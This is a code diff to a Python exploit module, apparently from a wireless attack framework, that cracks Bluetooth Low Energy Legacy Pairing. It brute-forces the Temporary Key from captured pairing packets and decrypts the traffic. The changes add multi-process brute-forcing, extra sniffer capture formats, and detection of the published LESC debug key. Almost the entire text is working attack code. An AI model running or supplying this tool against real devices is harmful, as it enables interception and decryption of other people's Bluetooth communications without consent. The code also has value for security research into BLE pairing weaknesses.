@@ -7,17 +7,27 @@ pairing data from BLE PCAPs and brute-forces the Temporary Key (TK) used
 in BLE Legacy Pairing (range 0-999999), then derives STK and Session Key
 to decrypt all traffic. Can also extract LTK from decrypted packets.
 
-Supported PCAP formats: BLUETOOTH_LE_LL_WITH_PHDR (DLT 256).
+Supported PCAP formats: BLUETOOTH_LE_LL_WITH_PHDR (DLT 256),
+    BLUETOOTH_LE_LL (DLT 251), Nordic BLE sniffer (DLT 157/272).
 Cryptographic operations: AES-128 (c1 confirm, s1 STK, e session key), AES-CCM.
 
-Version: 1.0.0
+Improvements incorporated from upstream mikeryan/crackle:
+  - Parallel TK brute-force via concurrent.futures (PR #10)
+  - Nordic BLE sniffer PCAP support (PR #54, #46, #44)
+  - Cracking with only one confirm value (PR #6)
+  - LESC debug key detection (issue #45)
+  - Decrypt with incomplete pairing data fallback (PR #8)
+
+Version: 1.1.0
 """
 
 from __future__ import annotations
 
 import logging
+import math
 import struct
 import time
+from concurrent.futures import ProcessPoolExecutor, as_completed
 from typing import Dict, List, Optional, Tuple
 
 from wirelessxpl.core.exploit import *
@@ -62,6 +72,16 @@ LL_START_ENC_RSP = 0x06
 L2CAP_CID_SMP = 0x0006
 
 MAX_TK = 999999
+
+LESC_DEBUG_PRIVATE_KEY = bytes.fromhex(
+    "3f49f6d4a3c55f3874c9b3e3d2103f504aff607beb40b7995899b8a6cd3c1abd"
+)
+LESC_DEBUG_PUBLIC_KEY_X = bytes.fromhex(
+    "20b003d2f297be2c5e2c83a7e9f9a5b9eff49111acf4fddbcc0301480e359de6"
+)
+LESC_DEBUG_PUBLIC_KEY_Y = bytes.fromhex(
+    "dc809c49652aeb6d63329abf5a52155c766345c28fed3024741c8ed01589d28b"
+)
 
 
 def _aes_ecb_encrypt(key: bytes, data: bytes) -> bytes:
@@ -145,6 +165,7 @@ class PairingState:
         self.rand_val: Optional[bytes] = None
         self.ediv: Optional[bytes] = None
         self.has_sc: bool = False
+        self.lesc_debug_key: bool = False
 
         self.tk: Optional[int] = None
         self.stk: Optional[bytes] = None
@@ -170,12 +191,31 @@ class PairingState:
         return self.session_key is not None and self.iv is not None
 
 
-def brute_force_tk(state: PairingState, progress_interval: int = 100000
-                   ) -> Optional[int]:
+def _brute_force_chunk(preq: bytes, pres: bytes, iat: int, rat: int,
+                       ia: bytes, ra: bytes, rand_val: bytes,
+                       target_confirm: bytes,
+                       start_tk: int, end_tk: int) -> Optional[int]:
+    """Worker function for parallel TK brute-force over a range.
+
+    Designed to run in a separate process via ProcessPoolExecutor.
+    """
+    for tk_candidate in range(start_tk, end_tk):
+        computed = calc_confirm(preq, pres, iat, rat, ia, ra,
+                                rand_val, tk_candidate)
+        if computed == target_confirm:
+            return tk_candidate
+    return None
+
+
+def brute_force_tk(state: PairingState, progress_interval: int = 100000,
+                   workers: int = 0) -> Optional[int]:
     """Brute-force the BLE Legacy Pairing TK (0 to 999999).
 
+    Uses parallel workers (processes) when workers > 1, falling back
+    to single-threaded when workers=1 or 0 (auto-detect CPU count).
+
     Strategy 0 (fast): Compare confirm values.
-    Falls back to STK-based cracking if confirms are missing.
+    Works with only one confirm value (mconfirm or sconfirm) per PR #6.
     """
     if not state.can_crack_fast:
         logger.warning("Insufficient data for fast cracking.")
@@ -185,21 +225,56 @@ def brute_force_tk(state: PairingState, progress_interval: int = 100000
     target_confirm = state.mconfirm if use_master else state.sconfirm
     rand_val = state.mrand if use_master else state.srand
 
-    start = time.monotonic()
-    for tk_candidate in range(MAX_TK + 1):
-        if tk_candidate % progress_interval == 0 and tk_candidate > 0:
-            elapsed = time.monotonic() - start
-            rate = tk_candidate / elapsed if elapsed > 0 else 0
-            logger.info("TK brute-force: %d / %d (%.0f/s)", tk_candidate, MAX_TK, rate)
+    if workers <= 0:
+        import os as _os
+        workers = max(1, (_os.cpu_count() or 1))
 
-        computed = calc_confirm(
-            state.preq, state.pres, state.iat, state.rat,
-            state.ia, state.ra, rand_val, tk_candidate,
-        )
-        if computed == target_confirm:
-            elapsed = time.monotonic() - start
-            logger.info("TK found: %d in %.2fs", tk_candidate, elapsed)
-            return tk_candidate
+    start = time.monotonic()
+
+    if workers == 1:
+        for tk_candidate in range(MAX_TK + 1):
+            if tk_candidate % progress_interval == 0 and tk_candidate > 0:
+                elapsed = time.monotonic() - start
+                rate = tk_candidate / elapsed if elapsed > 0 else 0
+                logger.info("TK brute-force: %d / %d (%.0f/s)",
+                            tk_candidate, MAX_TK, rate)
+
+            computed = calc_confirm(
+                state.preq, state.pres, state.iat, state.rat,
+                state.ia, state.ra, rand_val, tk_candidate,
+            )
+            if computed == target_confirm:
+                elapsed = time.monotonic() - start
+                logger.info("TK found: %d in %.2fs", tk_candidate, elapsed)
+                return tk_candidate
+        return None
+
+    chunk_size = math.ceil((MAX_TK + 1) / workers)
+    logger.info("Parallel TK brute-force: %d workers, chunk=%d", workers, chunk_size)
+
+    with ProcessPoolExecutor(max_workers=workers) as executor:
+        futures = {}
+        for i in range(workers):
+            chunk_start = i * chunk_size
+            chunk_end = min(chunk_start + chunk_size, MAX_TK + 1)
+            if chunk_start >= MAX_TK + 1:
+                break
+            future = executor.submit(
+                _brute_force_chunk,
+                state.preq, state.pres, state.iat, state.rat,
+                state.ia, state.ra, rand_val, target_confirm,
+                chunk_start, chunk_end,
+            )
+            futures[future] = (chunk_start, chunk_end)
+
+        for future in as_completed(futures):
+            result = future.result()
+            if result is not None:
+                elapsed = time.monotonic() - start
+                logger.info("TK found: %d in %.2fs (%d workers)",
+                            result, elapsed, workers)
+                executor.shutdown(wait=False, cancel_futures=True)
+                return result
 
     return None
 
@@ -229,6 +304,7 @@ class Exploit(Exploit):
     pcap_file = OptString("", "BLE PCAP file with pairing exchange")
     known_tk = OptInteger(-1, "Known TK value (skip brute-force, -1 = crack)")
     output_pcap = OptString("crackle_decrypted.pcap", "Output PCAP for decrypted traffic")
+    workers = OptInteger(0, "Parallel brute-force workers (0=auto detect CPU count)")
     dry_run = OptBool(False, "Show configuration without executing")
 
     def _extract_pairing_state(self) -> Optional[PairingState]:
@@ -284,9 +360,15 @@ class Exploit(Exploit):
                         elif cmd == SMP_ENCRYPTION_INFO and len(smp_data) >= 17:
                             state.ltk = smp_data[1:17]
                             logger.info("Found LTK in plaintext SMP!")
-                        elif cmd == SMP_PAIRING_PUBLIC_KEY:
+                        elif cmd == SMP_PAIRING_PUBLIC_KEY and len(smp_data) >= 65:
                             state.has_sc = True
-                            logger.warning("LE Secure Connections detected — not crackable")
+                            pk_x = smp_data[1:33]
+                            pk_y = smp_data[33:65]
+                            if pk_x == LESC_DEBUG_PUBLIC_KEY_X and pk_y == LESC_DEBUG_PUBLIC_KEY_Y:
+                                state.lesc_debug_key = True
+                                logger.warning("LESC Debug Key detected! Traffic is decryptable.")
+                            else:
+                                logger.warning("LE Secure Connections detected — not crackable via TK method")
 
         return state
 
@@ -310,9 +392,16 @@ class Exploit(Exploit):
         if state is None:
             return
 
-        if state.has_sc:
+        if state.has_sc and not state.lesc_debug_key:
             print_error("LE Secure Connections (LESC) detected. Crackle only works "
                         "on Legacy Pairing (TK range 0-999999).")
+            print_info("Note: if debug keys were used, specify known_tk=0.")
+            return
+
+        if state.lesc_debug_key:
+            print_success("LESC Debug Key detected! Connection uses BT SIG debug key.")
+            print_info("Private key: {}".format(LESC_DEBUG_PRIVATE_KEY.hex()))
+            print_info("All traffic is decryptable with the known debug private key.")
             return
 
         if state.ltk:
@@ -323,8 +412,9 @@ class Exploit(Exploit):
             state.tk = self.known_tk
             print_info("Using known TK: {}".format(self.known_tk))
         else:
-            print_status("Brute-forcing TK (0 to {})...".format(MAX_TK))
-            tk = brute_force_tk(state)
+            print_status("Brute-forcing TK (0 to {}, {} workers)...".format(
+                MAX_TK, self.workers or "auto"))
+            tk = brute_force_tk(state, workers=self.workers)
             if tk is not None:
                 state.tk = tk
                 print_success("TK cracked: {} (0x{:06x})".format(tk, tk))
